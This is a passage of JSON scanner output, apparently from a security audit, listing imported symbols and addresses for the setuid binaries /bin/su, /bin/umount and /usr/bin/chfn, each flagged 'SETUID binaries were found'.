                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fd0",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fd8",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fe0",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fe8",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ff0",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012020",
                        "__progname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012028",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012030",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012040",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00012060",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c60",
                        "mnt_table_set_parser_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c68",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c70",
                        "mnt_context_is_restricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c78",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c80",
                        "mnt_unref_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c88",
                        "mnt_context_next_umount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c90",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008c98",
                        "mnt_context_helper_executed",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ca0",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ca8",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cb0",
                        "secure_getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cb8",
                        "mnt_context_enable_fake",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cc0",
                        "warn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cc8",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cd0",
                        "mnt_context_switch_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cd8",
                        "mnt_table_next_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ce0",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ce8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cf0",
                        "mnt_new_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008cf8",
                        "mnt_context_get_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d00",
                        "mnt_context_disable_swapmatch",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d08",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d10",
                        "mnt_context_find_umount_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d18",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d20",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d28",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d30",
                        "mnt_get_library_features",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d38",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d40",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d48",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d50",
                        "errx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d58",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d60",
                        "warnx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d68",
                        "mnt_context_force_unrestricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d70",
                        "mnt_context_umount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d78",
                        "nanosleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d80",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d88",
                        "mnt_new_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d90",
                        "dup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008d98",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008da0",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008da8",
                        "mnt_context_disable_helpers",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008db0",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008db8",
                        "getcwd",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dc0",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dc8",
                        "mnt_context_set_tables_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dd0",
                        "pipe",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008dd8",
                        "mnt_new_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008de0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008de8",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008df0",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008df8",
                        "mnt_fs_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e00",
                        "mnt_context_switch_target_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e08",
                        "mnt_fs_get_srcpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e10",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e18",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e20",
                        "mnt_context_enable_loopdel",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e28",
                        "mnt_context_tab_applied",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e30",
                        "prctl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e38",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e40",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e48",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e50",
                        "mnt_init_debug",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e58",
                        "mnt_context_syscall_called",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e60",
                        "err",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e68",
                        "mnt_context_set_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e70",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e78",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e80",
                        "mnt_context_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e88",
                        "mnt_context_get_excode",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e90",
                        "mnt_free_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008e98",
                        "mnt_context_is_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ea0",
                        "mnt_context_set_target_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ea8",
                        "getegid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008eb0",
                        "mnt_table_set_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008eb8",
                        "mnt_context_enable_lazy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ec0",
                        "mnt_table_find_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ec8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ed0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ed8",
                        "mnt_context_enable_force",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ee0",
                        "mnt_fs_get_devno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ee8",
                        "mnt_context_get_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ef0",
                        "mnt_get_library_version",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ef8",
                        "mnt_reset_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f00",
                        "memmove",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f08",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f18",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f20",
                        "mnt_context_enable_rdonly_umount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f28",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f30",
                        "mnt_context_set_options_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f38",
                        "mnt_free_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f40",
                        "mnt_context_disable_canonicalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f48",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f50",
                        "mnt_context_set_fstype_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f58",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f60",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f68",
                        "fwrite",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f70",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f78",
                        "mnt_context_enable_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f80",
                        "mnt_table_next_child_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f88",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f90",
                        "mnt_context_disable_mtab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008f98",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fa0",
                        "mnt_table_parse_file",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fa8",
                        "mnt_tag_is_valid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fb0",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fb8",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fc0",
                        "mnt_context_get_status",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fc8",
                        "mnt_context_get_syscall_errno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fd0",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fd8",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fe0",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fe8",
                        "environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009020",
                        "__progname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009028",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009030",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009040",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009060",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x000032d0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x00003370",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc38",
                        "__strcat_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc40",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc48",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc50",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc58",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc60",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc68",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc70",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc78",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc80",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc88",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc90",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc98",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dca0",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dca8",
                        "puts",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcb0",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcb8",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcc0",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcc8",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcd0",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcd8",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dce0",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dce8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcf0",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcf8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd00",
                        "getpwuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd08",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd10",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd18",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd20",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd28",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd30",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd38",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd40",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd48",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd50",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd58",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd60",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd68",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd70",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd78",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd80",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd88",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd90",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd98",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dda0",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dda8",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddb0",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddb8",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddc0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddc8",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddd0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddd8",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dde0",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dde8",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddf0",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddf8",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de00",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de08",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de10",
                        "__memcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de18",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de20",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de28",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de30",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de38",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de40",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de48",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de50",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de58",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de60",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de68",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de70",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de78",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de80",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de88",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de90",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de98",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dea0",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dea8",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000deb0",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000deb8",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dec0",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dec8",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ded0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ded8",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dee0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dee8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000def0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000def8",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df00",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df08",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df18",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df20",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df28",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df30",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df38",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df40",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df48",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df50",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df58",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df60",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df68",
                        "pam_acct_mgmt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df70",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df78",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df80",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df88",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df90",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df98",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfa0",
                        "pam_authenticate",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfa8",
                        "putpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfb0",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfb8",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfc0",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000e120",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
